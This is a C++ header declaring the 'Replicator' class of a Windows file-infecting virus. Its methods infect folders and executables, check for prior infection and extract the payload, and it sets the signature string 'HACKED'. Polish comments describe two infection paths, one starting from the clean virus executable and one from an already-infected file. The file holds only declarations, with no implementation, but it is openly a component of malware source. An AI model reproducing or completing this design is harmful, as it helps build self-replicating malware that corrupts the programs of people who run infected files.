#ifndef REPLICATOR_H_INCLUDED
#define REPLICATOR_H_INCLUDED

#include <windows.h>
#include <string>

using namespace std;

DWORD WINAPI Run(LPVOID lpParam);

class Replicator
{
public:
    Replicator();
    void Start();
    void Stop();

    bool CheckInfected(char*path);
    void InfectFolder(char*path);
    void InfectFolder2(char*path);
    void Extract();
    bool CanInfect();

private:
    // funkcja infekujaca, ktora rozpoczyna dzialanie w przypdku
    // infekcji z czystego exe wirusa
    void Infect(char*dest);

    DWORD GetFileSize(char *path);
    char *LoadFileIntoRam(char *path);
    char *CasualName();
    char *GetTempFile();
    char *AppPath();

    char* GetMyPath();

    // funkcja infekujaca, ktora rozpoczyna dzialanie w przypadku
    // infekcji z juz zainfekowanego exe
    int Infect2(char*dest);
    string GetText(string path);



    const char * infection = "HIGH";
    const char * virus_sig ="HACKED";
    HANDLE ThreadHandle;
    volatile bool canInfect;


};

#endif // REPLICATOR_H_INCLUDED
